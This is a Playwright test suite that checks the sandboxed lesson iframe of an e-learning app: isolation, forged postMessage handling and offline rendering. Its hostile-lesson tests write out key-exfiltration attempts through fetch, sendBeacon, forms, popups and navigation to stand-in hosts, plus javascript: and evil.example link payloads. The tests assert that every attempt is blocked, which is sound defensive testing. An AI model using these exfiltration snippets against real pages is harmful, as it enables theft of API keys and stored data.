// T-045 (developer): the lesson in an opaque origin with a postMessage bridge
// (D-029, D-031, LESSON-ISOLATION §3–§5, checks П-1…П-4 of §7).
// Synthetic data only (D-026): tests/fixtures/LRN-DEMO and small courses built
// in memory here (LRN-EVIL, LRN-PIC, LRN-NAV, LRN-BROKEN). A fake key is put in
// the settings; every external request goes to a stub, nothing leaves.
import { test, expect } from '@playwright/test';
import { readFileSync } from 'node:fs';
import { DRIVE_ZIP_NAME, readFixture, makeZip, asFile } from '../fixtures/zips.mjs';
import { strToU8 } from '../../vendor/fflate.js';

const FILES = readFixture();
const LESSON_PATH = 'lessons/0001-vidove-chay.html';
const FAKE_KEY = 'sk-ant-T045-FAKE-KEY';
// T-050-fix: the render version is read from the renderer, not written here (it was 3 until 0.6.1).
const RENDER_VERSION = Number(/export const RENDER_VERSION = (\d+)/.exec(readFileSync(new URL('../../src/lesson-render.js', import.meta.url), 'utf8'))[1]);
const SHELL_CACHE = `easylrn-shell-${/APP_VERSION = '([^']+)'/.exec(readFileSync(new URL('../../src/config.js', import.meta.url), 'utf8'))[1]}`;
// 1×1 PNG (one red pixel).
const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==', 'base64');

let problems;
let allowed;
let consoleAll; // every console message (warnings too): "can escape its sandboxing" must never appear
let leaked; // external requests that really finished
let popups;
test.beforeEach(async ({ page, context }) => {
  problems = [];
  allowed = [];
  consoleAll = [];
  leaked = [];
  popups = [];
  page.on('console', (m) => {
    consoleAll.push(`${m.type()}: ${m.text()}`);
    if (m.type() === 'error') problems.push(m.text());
  });
  page.on('pageerror', (e) => problems.push(String(e)));
  context.on('requestfinished', (q) => { if (!/^https?:\/\/localhost/.test(q.url()) && /^https?:/.test(q.url())) leaked.push(q.url()); });
  context.on('page', (p) => { if (p !== page) popups.push(p); });
  await context.route(/^https?:\/\/(?!localhost)/, (route) => route.fulfill({ status: 200, contentType: 'text/html', body: '<p>external</p>' }));
  await page.goto('./');
  await expect(page.locator('[data-screen="courses"]')).toBeVisible();
  await page.evaluate(() => navigator.serviceWorker.ready.then(() => true));
  await page.reload();
  expect(await page.evaluate(() => !!navigator.serviceWorker.controller)).toBe(true);
});
test.afterEach(() => {
  expect(problems.filter((p) => !allowed.some((re) => re.test(p)))).toEqual([]);
  expect(consoleAll.filter((m) => /escape its sandboxing/i.test(m))).toEqual([]);
});

async function importFiles(page, files) {
  return page.evaluate(async (files) => {
    const m = await import('./src/course-import.js');
    const list = files.map((f) => new File([new Uint8Array(f.bytes)], f.name));
    return m.describeSummary(await m.importCourse(list));
  }, files.map((f) => ({ name: f.name, bytes: [...f.buffer] })));
}
const importDemo = (page) => importFiles(page, [asFile(DRIVE_ZIP_NAME, makeZip(FILES))]);
const importCourse = (page, id, files) => importFiles(page, [asFile(`${id}.zip`, makeZip(files, { root: id }))]);

const lf = (page) => page.frameLocator('iframe.lesson-frame');
const frameOf = (page, course) => page.frames().find((f) => f.url().includes(`/EasyLRN/c/${course}/`));
const state = (page) => page.locator('.lesson-frame__wrap').getAttribute('data-lesson-state');

async function open(page, course, number = '0001', query = '') {
  await page.goto(`./#/c/${course}`);
  await page.goto(`./#/c/${course}/read/${number}${query}`);
  await expect(page.locator('[data-lesson-state="ready"]')).toBeVisible();
  return frameOf(page, course);
}

const html = (body, head = '') => strToU8(`<!DOCTYPE html><html lang="bg"><head><meta charset="utf-8"><title>Урок</title>${head}</head><body>${body}</body></html>`);

// --- П-1: delivery ------------------------------------------------------------------

test.describe('T-045 П-1 delivery: opaque origin, served by the Service Worker, self-contained', () => {
  test('the lesson frame: sandbox="allow-scripts", origin "null", own CSS/JS inlined, bridge at the end, no Google Fonts', async ({ page, context }) => {
    const google = [];
    context.on('request', (q) => { if (/fonts\.g/.test(q.url())) google.push(q.url()); });
    await importDemo(page);
    const f = await open(page, 'LRN-DEMO');
    const frame = page.locator('iframe.lesson-frame');
    await expect(frame).toHaveAttribute('sandbox', 'allow-scripts');
    await expect(frame).toHaveAttribute('allow', 'clipboard-write *');
    await expect(frame).toHaveAttribute('referrerpolicy', 'no-referrer');
    const r = await f.evaluate(() => ({
      origin: self.origin,
      inline: document.documentElement.getAttribute('data-inline-script'),
      kicker: getComputedStyle(document.querySelector('.kicker')).textTransform,
      quiz: !!document.querySelector('.quiz .quiz-choice'),
      external: document.querySelectorAll('script[src], link[rel~="stylesheet"]').length,
      bridgeLast: document.body.lastElementChild?.matches('script[type="module"][data-easylrn="bridge"]'),
      bridgeStyle: !!document.querySelector('style[data-easylrn="bridge"]'),
    }));
    expect(r).toEqual({ origin: 'null', inline: 'ran', kicker: 'uppercase', quiz: true, external: 0, bridgeLast: true, bridgeStyle: true });
    // The response itself carries the sandbox (the lesson can never remove it).
    const csp = await page.evaluate(async () => (await fetch('./c/LRN-DEMO/lessons/0001-vidove-chay.html')).headers.get('content-security-policy'));
    expect(csp.split('; ')[0]).toBe('sandbox allow-scripts');
    expect(csp).not.toMatch(/googleapis|gstatic|'self'.*script-src|allow-same-origin/);
    expect(google).toEqual([]);
  });

  test('assembly: relative CSS (also with an upper-case extension), CSS url() and images become inline; Google Fonts and hints go; links are collected', async ({ page }) => {
    const course = {
      'INDEX.md': strToU8('# LRN-PIC\n'),
      'assets/S.CSS': strToU8("@import url('https://fonts.googleapis.com/css2?family=X');\n.box { width: 10px; height: 10px; background-image: url(dot.png); }\nh1 { color: rgb(1, 2, 3); }"),
      'assets/dot.png': PNG,
      'lessons/0001-pic.html': html(
        '<h1>Снимки</h1><div class="box" id="box"></div><img id="img" src="../assets/dot.png" alt=""><img id="set" srcset="../assets/dot.png 1x" alt="">'
        + '<p style="background:url(\'../assets/dot.png\')" id="styled">x</p>'
        + '<a href="https://example.org/a?x=1&amp;y=2">външен</a> <a href="../lessons/0001-pic.html#box">котва</a> <a href="#box">тук</a>',
        '<link rel="preconnect" href="https://fonts.gstatic.com"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Y">'
        + '<link rel="stylesheet" href="../assets/S.CSS"><style>@import "https://fonts.googleapis.com/css2?family=Z"; p { margin: 0 }</style>',
      ),
    };
    await importCourse(page, 'LRN-PIC', course);
    const f = await open(page, 'LRN-PIC');
    const r = await f.evaluate(async () => {
      await Promise.all([...document.images].map((i) => (i.complete ? null : new Promise((ok) => { i.onload = ok; i.onerror = ok; }))));
      return {
        img: document.getElementById('img').naturalWidth,
        set: document.getElementById('set').naturalWidth,
        h1: getComputedStyle(document.querySelector('h1')).color,
        bg: getComputedStyle(document.getElementById('box')).backgroundImage.slice(0, 26),
        styled: getComputedStyle(document.getElementById('styled')).backgroundImage.slice(0, 26),
        google: document.documentElement.outerHTML.includes('fonts.g') && /<link[^>]+fonts\.g|@import[^;]*fonts\.g/.test(document.documentElement.outerHTML),
      };
    });
    expect(r).toEqual({ img: 1, set: 1, h1: 'rgb(1, 2, 3)', bg: 'url("data:image/png;base64', styled: 'url("data:image/png;base64', google: false });
    const file = await page.evaluate(async () => {
      const f = await (await import('./src/db.js')).getFile('LRN-PIC', 'lessons/0001-pic.html');
      return { links: f.links, version: f.renderVersion, sameSha: f.renderSha === f.sha256, deps: Object.keys(f.renderDeps).sort(), original: (await f.blob.text()).includes('../assets/S.CSS') };
    });
    expect(file.links).toEqual(expect.arrayContaining(['https://example.org/a?x=1&y=2', expect.stringMatching(/\/EasyLRN\/c\/LRN-PIC\/lessons\/0001-pic\.html#box$/)]));
    expect(file).toMatchObject({ version: RENDER_VERSION, sameSha: true, deps: ['assets/S.css', 'assets/dot.png'], original: true });
  });

  test('RENDER_VERSION is the same in the Service Worker and in lesson-render.js; the bridge files are clean modules', async () => {
    const sw = readFileSync(new URL('../../sw.js', import.meta.url), 'utf8');
    const render = readFileSync(new URL('../../src/lesson-render.js', import.meta.url), 'utf8');
    expect(/const RENDER_VERSION = (\d+)/.exec(sw)[1]).toBe(/export const RENDER_VERSION = (\d+)/.exec(render)[1]);
    for (const name of ['anchor.js', 'lesson-bridge.js', 'lesson-guard.js']) {
      const text = readFileSync(new URL(`../../src/${name}`, import.meta.url), 'utf8');
      expect(text, name).not.toMatch(/^\s*import\b/m);
      expect(text, name).not.toMatch(/<\/script/i);
    }
    expect(sw).toContain("'./src/lesson-bridge.js'");
    expect(sw).toContain("'./src/anchor.js'");
    expect(sw).toContain("'./src/lesson-guard.js'");
    expect(sw).toContain("'./src/lesson-render.js'");
  });

  test('a missing or stale render: the Service Worker answers 404; opening the lesson renders it again (also offline)', async ({ page, context }) => {
    allowed = [/status of 404/];
    await importDemo(page);
    const drop = (patch) => page.evaluate(async (patch) => {
      const db = await import('./src/db.js');
      const handle = await db.openDb();
      const rec = await handle.get('files', 'LRN-DEMO/lessons/0001-vidove-chay.html');
      await handle.put('files', { ...rec, ...patch });
    }, patch);
    const probe = () => page.evaluate(async () => {
      const r = await fetch('./c/LRN-DEMO/lessons/0001-vidove-chay.html');
      const t = await r.text();
      return `${r.status} ${t.includes('easylrn-error') ? 'error' : ''}${t.includes('data-easylrn="bridge"') ? 'bridge' : ''}`;
    });
    expect(await probe()).toBe('200 bridge');
    await drop({ renderVersion: 0 });
    expect(await probe()).toBe('404 error');
    await drop({ rendered: undefined });
    expect(await probe()).toBe('404 error');
    await context.setOffline(true);
    try {
      const f = await open(page, 'LRN-DEMO');
      expect(await f.evaluate(() => self.origin)).toBe('null');
      expect(await probe()).toBe('200 bridge');
      await lf(page).locator('.quiz-choice').first().click();
      await expect(lf(page).locator('.quiz-note')).toBeVisible();
    } finally {
      await context.setOffline(false);
    }
  });

  test('the old font cache of 0.4.0 (easylrn-fonts) is deleted when the new version activates', async ({ page }) => {
    await page.evaluate(async () => {
      for (const r of await navigator.serviceWorker.getRegistrations()) await r.unregister();
      const c = await caches.open('easylrn-fonts');
      await c.put('https://fonts.googleapis.com/css2?family=X', new Response('/* */'));
    });
    await page.reload();
    await page.evaluate(() => navigator.serviceWorker.ready.then(() => true));
    await expect.poll(() => page.evaluate(async () => (await caches.keys()).sort())).toEqual([SHELL_CACHE]);
  });
});

// --- П-2: a hostile lesson ------------------------------------------------------------

const EVIL = {
  'INDEX.md': strToU8('# LRN-EVIL\n'),
  'lessons/0001-urok.html': html('<h1>Урок</h1><p style="height:1500px">…</p>'),
  'lessons/0002-vtori.html': html('<h1>Втори</h1>'),
};

test.describe('T-045 П-2 a hostile lesson cannot reach the app or the network', () => {
  test('20 attempts from the lesson: all blocked, the key never read, nothing leaves, the app is unchanged', async ({ page }) => {
    allowed = [/Content Security Policy|Refused to|violates|sandbox|Blocked|Unsafe attempt|not allowed|Failed to load|status of 40|ERR_/i];
    await page.evaluate(async (k) => {
      await (await import('./src/db.js')).saveSettings({ apiKey: k });
      localStorage.setItem('t045', 'LS-SECRET');
    }, FAKE_KEY);
    await importCourse(page, 'LRN-EVIL', EVIL);
    const f = await open(page, 'LRN-EVIL');
    const appUrl = page.url();
    const r = await f.evaluate(async (k) => {
      const out = {};
      const attempt = async (name, fn) => {
        try { const v = await fn(); out[name] = v === undefined ? 'no error' : String(v); } catch (e) { out[name] = `blocked:${e.name}`; }
      };
      await attempt('parent.document', () => parent.document.title);
      await attempt('frameElement', () => (window.frameElement === null ? 'null' : 'element'));
      await attempt('localStorage', () => localStorage.getItem('t045'));
      await attempt('sessionStorage', () => sessionStorage.length);
      await attempt('indexedDB', () => new Promise((ok, fail) => { const q = indexedDB.open('lrn-app'); q.onsuccess = () => ok('opened'); q.onerror = () => fail(q.error); }));
      await attempt('caches', () => caches.keys());
      await attempt('cookie', () => { document.cookie = 'a=1'; return document.cookie; });
      await attempt('serviceWorker', () => navigator.serviceWorker.register('x.js'));
      await attempt('parent.open', () => parent.open(`https://example.org/po?k=${k}`));
      await attempt('window.open', () => (window.open(`https://example.org/wo?k=${k}`) === null ? 'null' : 'window'));
      await attempt('top.location', () => { top.location.href = `https://example.org/top?k=${k}`; });
      await attempt('parent.hash', () => { parent.location.hash = '#/settings'; });
      await attempt('parent.fetch', () => parent.fetch('https://api.anthropic.com/v1/messages', { method: 'POST', headers: { 'x-api-key': k } }));
      await attempt('fetch', () => fetch(`https://example.org/f?k=${k}`));
      await attempt('xhr', () => new Promise((ok, fail) => { const x = new XMLHttpRequest(); x.open('GET', 'https://example.org/x'); x.onload = ok; x.onerror = () => fail(new Error('xhr')); x.send(); }));
      await attempt('beacon', () => navigator.sendBeacon('https://example.org/b', k));
      const click = (attrs) => { const a = document.createElement('a'); Object.assign(a, attrs); document.body.append(a); a.click(); a.remove(); };
      await attempt('a target=_top', () => click({ href: `https://example.org/at?k=${k}`, target: '_top' }));
      await attempt('a target=_blank', () => click({ href: `https://example.org/ab?k=${k}`, target: '_blank' }));
      await attempt('form', () => { const fm = document.createElement('form'); fm.action = 'https://example.org/form'; fm.method = 'post'; document.body.append(fm); fm.submit(); });
      await attempt('iframe', () => { const i = document.createElement('iframe'); i.src = 'https://example.org/if'; document.body.append(i); });
      await attempt('img', () => new Promise((ok, fail) => { const i = new Image(); i.onload = () => ok('loaded'); i.onerror = () => fail(new Error('img')); i.src = 'https://example.org/i.png'; }));
      await new Promise((ok) => setTimeout(ok, 800));
      return out;
    }, FAKE_KEY);
    for (const name of ['parent.document', 'localStorage', 'sessionStorage', 'indexedDB', 'caches', 'cookie', 'serviceWorker', 'parent.open', 'top.location', 'parent.hash', 'parent.fetch', 'fetch', 'xhr', 'img']) {
      expect(r[name], name).toMatch(/^blocked:/);
    }
    expect(r.frameElement).toBe('null');
    expect(r['window.open']).toBe('null');
    expect(JSON.stringify(r)).not.toMatch(/LS-SECRET|sk-ant-T045/);
    await page.waitForTimeout(500);
    expect(leaked).toEqual([]);
    expect(popups).toEqual([]);
    expect(page.url()).toBe(appUrl);
    expect(await page.title()).toBe('Урок 0001 · EasyLRN');
    expect(await page.evaluate(async () => (await (await import('./src/db.js')).getSettings()).apiKey)).toBe(FAKE_KEY);
  });

  test('self-navigation of the lesson frame (../index.html, another lesson, data:, external): the app never starts inside, the lesson is loaded again', async ({ page }) => {
    // The app's index.html in an opaque frame: its module script is refused (CORS from origin "null").
    allowed = [/status of 404|Refused to frame|violates|Failed to load|ERR_|Not allowed to navigate|net::|blocked by CORS policy/i];
    await importCourse(page, 'LRN-EVIL', EVIL);
    for (const target of ['../../../index.html', '../../../index.html#/settings', './0002-vtori.html', 'data:text/html,<h1>x</h1>', 'https://example.org/nav?k=1']) {
      const f = await open(page, 'LRN-EVIL');
      await f.evaluate((t) => { location.href = t; }, target);
      await expect(page.locator('[data-field="lesson-note"]'), target).toHaveText('Урокът се опита да отвори друга страница; зареден е отново.');
      await expect(page.locator('[data-lesson-state="ready"]'), target).toBeVisible();
      for (const fr of page.frames()) {
        if (fr === page.mainFrame()) continue;
        const inside = await fr.evaluate(() => ({ origin: self.origin, app: !!document.querySelector('[data-screen], .app-bar') })).catch(() => ({ origin: 'gone', app: false }));
        expect(inside.app, target).toBe(false);
        expect(['null', 'gone'], target).toContain(inside.origin);
      }
      await expect(lf(page).locator('h1')).toHaveText('Урок');
    }
    expect(leaked).toEqual([]);
    expect(page.url()).toMatch(/#\/c\/LRN-EVIL\/read\/0001$/);
  });

  test('a lesson that navigates itself at once from an inline script: never the app inside, stopped after two attempts', async ({ page }) => {
    allowed = [/status of 404|Failed to load|ERR_|net::|blocked by CORS policy/i];
    await importCourse(page, 'LRN-NAV', {
      'INDEX.md': strToU8('# LRN-NAV\n'),
      'lessons/0001-nav.html': html('<h1>Урок</h1><script>location.href = "../../../index.html";</script>'),
    });
    await page.goto('./#/c/LRN-NAV');
    await page.goto('./#/c/LRN-NAV/read/0001');
    await expect(page.locator('[data-lesson-state="error"]')).toBeVisible({ timeout: 15000 });
    await expect(page.locator('.lesson-frame__status')).toHaveText('Урокът опитва да отвори други страници и е спрян. Отвори го отново от курса.');
    for (const fr of page.frames()) {
      if (fr === page.mainFrame()) continue;
      expect(await fr.evaluate(() => !!document.querySelector('[data-screen]')).catch(() => false)).toBe(false);
    }
    expect(page.url()).toMatch(/#\/c\/LRN-NAV\/read\/0001$/);
    expect(leaked).toEqual([]);
  });

  test('the app refuses to start inside a frame (no screens, no database)', async ({ page }) => {
    await page.evaluate(() => new Promise((ok) => {
      const i = document.createElement('iframe');
      i.id = 'inner';
      i.onload = ok;
      i.src = './#/settings';
      document.body.append(i);
    }));
    const inner = page.frames().find((f) => f !== page.mainFrame());
    await expect(page.frameLocator('#inner').locator('[data-field="framed"]')).toHaveText('EasyLRN не работи вътре в друга страница. Отвори приложението директно.');
    expect(await inner.evaluate(() => document.querySelectorAll('[data-screen], .app-bar').length)).toBe(0);
    const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
    expect(csp).toContain("frame-src 'self';");
    expect(csp).not.toMatch(/frame-src[^;]*blob:/);
  });
});

// --- П-3: the bridge and the checks of the app -----------------------------------------------

test.describe('T-045 П-3 bridge protocol and the checks in the app (§5.3)', () => {
  test('forged messages are ignored: wrong source, wrong shape, limits, no gesture, not in the allowlist, flood', async ({ page }) => {
    test.setTimeout(60_000);
    await importDemo(page);
    const f = await open(page, 'LRN-DEMO');
    const frame = page.locator('iframe.lesson-frame');
    const height = () => frame.evaluate((el) => el.getBoundingClientRect().height);
    const h0 = await height();
    const y0 = await page.evaluate(() => scrollY);

    // Playwright's evaluate() counts as a user gesture: the forged messages are posted
    // after the transient activation has expired (5 s in Chromium), as a lesson timer would.
    const LATER = 5600;
    // From the app window itself (not the lesson frame).
    await page.evaluate((later) => setTimeout(() => {
      window.postMessage({ lrn: 1, type: 'lrn:size', height: 77 }, '*');
      window.postMessage({ lrn: 1, type: 'lrn:link', href: 'https://example.org/tea' }, '*');
    }, later), LATER);
    // From the lesson: bad shapes and values.
    await f.evaluate((later) => setTimeout(() => {
      const p = (m) => parent.postMessage(m, '*');
      p({ lrn: 2, type: 'lrn:size', height: 50 });
      p({ type: 'lrn:size', height: 50 });
      p({ lrn: 1, type: 'lrn:unknown', height: 50 });
      p([{ lrn: 1, type: 'lrn:size', height: 50 }]);
      p('lrn:size');
      p({ lrn: 1, type: 'lrn:size', height: -5 });
      p({ lrn: 1, type: 'lrn:size', height: 1e9 });
      p({ lrn: 1, type: 'lrn:size', height: '50' });
      p({ lrn: 1, type: 'lrn:size', height: NaN });
      p({ lrn: 1, type: 'lrn:ready', v: 1, title: 'x'.repeat(1e6) });
      p({ lrn: 1, type: 'lrn:selection', empty: false, quote: { exact: 'x'.repeat(3000) }, position: { start: 0, end: 3000 } });
      p({ lrn: 1, type: 'lrn:selection', empty: false, quote: { exact: 'x' }, position: { start: 5, end: 2 } });
      p({ lrn: 1, type: 'lrn:tap', annotationId: 'foreign-id' });
      p({ lrn: 1, type: 'lrn:tap', annotationId: 'x'.repeat(100) });
      p({ lrn: 1, type: 'lrn:position', top: 900 }); // never asked for
      p({ lrn: 1, type: 'lrn:anchor', top: 900 }); // no gesture
      // Links without a user gesture (also allowlisted ones), javascript:, data:, foreign URLs.
      for (const href of ['https://example.org/tea', 'javascript:alert(1)', 'data:text/html,x', 'https://evil.example/x', '../../../index.html#/settings', 'x'.repeat(5000)]) {
        p({ lrn: 1, type: 'lrn:link', href });
      }
      document.documentElement.setAttribute('data-forged', 'sent');
    }, later), LATER);
    // Wait without evaluate() calls (each one would be a new gesture).
    await page.waitForTimeout(LATER + 900);
    expect(await f.evaluate(() => document.documentElement.getAttribute('data-forged'))).toBe('sent');
    expect(Math.abs((await height()) - h0)).toBeLessThan(2);
    expect(await page.evaluate(() => scrollY)).toBe(y0);
    expect(popups).toEqual([]);
    expect(page.url()).toMatch(/#\/c\/LRN-DEMO\/read\/0001$/);
    expect(await state(page)).toBe('ready');

    // With a real gesture inside the lesson: a URL outside the allowlist is still refused,
    // an allowlisted one opens (opener === null).
    await f.evaluate(() => {
      for (const [id, href] of [['b-evil', 'https://evil.example/steal'], ['b-ok', 'https://example.org/tea']]) {
        const b = document.createElement('button');
        b.id = id;
        b.textContent = id;
        b.setAttribute('onclick', `parent.postMessage({ lrn: 1, type: 'lrn:link', href: '${href}' }, '*')`);
        document.querySelector('h1').after(b);
      }
    });
    await lf(page).locator('#b-evil').click();
    await page.waitForTimeout(500);
    expect(popups).toEqual([]);
    const popup = page.context().waitForEvent('page');
    await lf(page).locator('#b-ok').click();
    const tab = await popup;
    await tab.waitForLoadState();
    expect(tab.url()).toBe('https://example.org/tea');
    expect(await tab.evaluate(() => window.opener)).toBe(null);
    await tab.close();

    // Flood: 1000 messages at once; only the first ~60 in that second are taken.
    await f.evaluate(() => { for (let i = 1; i <= 1000; i++) parent.postMessage({ lrn: 1, type: 'lrn:size', height: i }, '*'); });
    await page.waitForTimeout(300);
    expect(await height()).toBeLessThanOrEqual(60);
    expect(await page.locator('[data-screen="reader"]').count()).toBe(1);
  });

  test('anchors: a click on #… and ?at= scroll the app window to the heading under the bar', async ({ page }) => {
    await importDemo(page);
    const check = async (id) => {
      const top = await lf(page).locator(`#${id}`).evaluate((el) => el.getBoundingClientRect().top);
      const frameTop = await page.locator('iframe.lesson-frame').evaluate((el) => el.getBoundingClientRect().top);
      const bar = await page.locator('.app-bar').evaluate((el) => el.getBoundingClientRect().height);
      const atEnd = await page.evaluate(() => Math.abs(scrollY - (document.scrollingElement.scrollHeight - innerHeight)) < 2);
      expect(atEnd || Math.abs(frameTop + top - bar - 8) < 3).toBe(true);
    };
    await open(page, 'LRN-DEMO', '0001', '?at=voda');
    await expect.poll(() => page.evaluate(() => scrollY)).toBeGreaterThan(300);
    await check('voda');
    await page.evaluate(() => window.scrollTo(0, 0));
    await lf(page).locator('a[href="#test"]').click();
    await expect.poll(() => page.evaluate(() => scrollY)).toBeGreaterThan(300);
    await check('test');
  });

  test('text size changes live (lrn:settings): 1 → 1.5 → 1.25 gives 18 → 27 → 22.5 px and the frame follows', async ({ page }) => {
    await importDemo(page);
    const f = await open(page, 'LRN-DEMO');
    const fontSize = () => f.evaluate(() => getComputedStyle(document.documentElement).fontSize);
    const diff = async () => Math.abs(await page.locator('iframe.lesson-frame').evaluate((el) => el.getBoundingClientRect().height)
      - await f.evaluate(() => document.documentElement.getBoundingClientRect().height));
    expect(await fontSize()).toBe('18px');
    for (const [scale, px] of [[1.5, '27px'], [1.25, '22.5px'], [1, '18px']]) {
      await page.evaluate(async (s) => (await import('./src/db.js')).saveSettings({ fontScale: s }), scale);
      await expect.poll(fontSize).toBe(px);
      await expect.poll(diff).toBeLessThan(2);
    }
  });

  test('selection: the bridge reports quote and position; the app keeps only checked data', async ({ page }) => {
    await importDemo(page);
    const f = await open(page, 'LRN-DEMO');
    await page.evaluate(() => {
      window.__sel = [];
      window.addEventListener('message', (e) => { if (e.data?.type === 'lrn:selection') window.__sel.push(e.data); });
    });
    await f.evaluate(() => {
      const p = document.querySelectorAll('main p')[1];
      const r = document.createRange();
      r.setStart(p.firstChild, 4);
      r.setEnd(p.firstChild, 24);
      getSelection().removeAllRanges();
      getSelection().addRange(r);
    });
    await expect.poll(() => page.evaluate(() => window.__sel.length)).toBeGreaterThan(0);
    const sel = await page.evaluate(() => window.__sel.at(-1));
    expect(sel.empty).toBe(false);
    // T-013: the quote is in the normalized text model (D-012, ARCHITECTURE §4.2):
    // white space runs are one space and the spaces at the ends are left out.
    const raw = await f.evaluate(() => document.querySelectorAll('main p')[1].firstChild.data.slice(4, 24));
    expect(sel.quote.exact).toBe(raw.replace(/\s+/g, ' ').trim());
    expect(sel.position.end - sel.position.start).toBe(sel.quote.exact.length);
    expect(typeof sel.quote.prefix).toBe('string');
  });

  test('reflect copies to the clipboard directly (allow="clipboard-write *")', async ({ page, context }) => {
    await context.grantPermissions(['clipboard-read', 'clipboard-write']);
    await importDemo(page);
    await open(page, 'LRN-DEMO');
    const r = lf(page).locator('.reflect');
    await r.locator('#t1').fill('Зелен');
    await r.locator('.reflect-collect').click();
    await expect(r.locator('.reflect-status')).toHaveText('Копирано.');
    expect(await page.evaluate(() => navigator.clipboard.readText())).toContain('Какъв чай пиеш най-често?: Зелен');
  });

  test('a lesson that breaks the bridge: after 8 s the lesson is shown with an inner scroll and a note', async ({ page }) => {
    test.setTimeout(40_000);
    await importCourse(page, 'LRN-BROKEN', {
      'INDEX.md': strToU8('# LRN-BROKEN\n'),
      'lessons/0001-broken.html': html('<h1>Урок</h1><p style="height:3000px">…</p><script>EventTarget.prototype.addEventListener = function () {};</script>'),
    });
    await page.goto('./#/c/LRN-BROKEN');
    await page.goto('./#/c/LRN-BROKEN/read/0001');
    await expect(lf(page).locator('h1')).toHaveText('Урок');
    expect(await state(page)).toBe('loading');
    await expect(page.locator('[data-lesson-state="fallback"]')).toBeVisible({ timeout: 12000 });
    await expect(page.locator('[data-field="lesson-note"]')).toHaveText('Маркирането не е налично за този урок.');
    const frame = page.locator('iframe.lesson-frame');
    expect(await frame.getAttribute('scrolling')).toBe(null);
    const h = await frame.evaluate((el) => el.getBoundingClientRect().height);
    expect(h).toBeGreaterThan(300);
    expect(h).toBeLessThanOrEqual(await page.evaluate(() => innerHeight));
    // The lesson scrolls inside its frame.
    const f = frameOf(page, 'LRN-BROKEN');
    expect(await f.evaluate(() => { window.scrollTo(0, 600); return window.scrollY; })).toBeGreaterThan(500);
  });
});

// --- П-4 / offline -------------------------------------------------------------------------------

test.describe('T-045 offline', () => {
  test('offline right after the import (never opened online): lesson, quiz, R01 and back', async ({ page, context }) => {
    await importDemo(page);
    await context.setOffline(true);
    try {
      await page.reload();
      await open(page, 'LRN-DEMO');
      await lf(page).locator('.quiz-choice').first().click();
      await expect(lf(page).locator('.quiz-note')).toBeVisible();
      await lf(page).locator('a', { hasText: 'R01 Температура и време' }).click();
      await expect(page).toHaveURL(/read\/R01$/);
      await expect(page.locator('[data-lesson-state="ready"]')).toBeVisible();
      await expect(lf(page).locator('h1')).toHaveText('Температура и време за запарване');
      await page.goBack();
      await expect(page.locator('[data-lesson-state="ready"]')).toBeVisible();
      await expect(lf(page).locator('h1')).toHaveText('Какви видове чай има?');
    } finally {
      await context.setOffline(false);
    }
  });
});
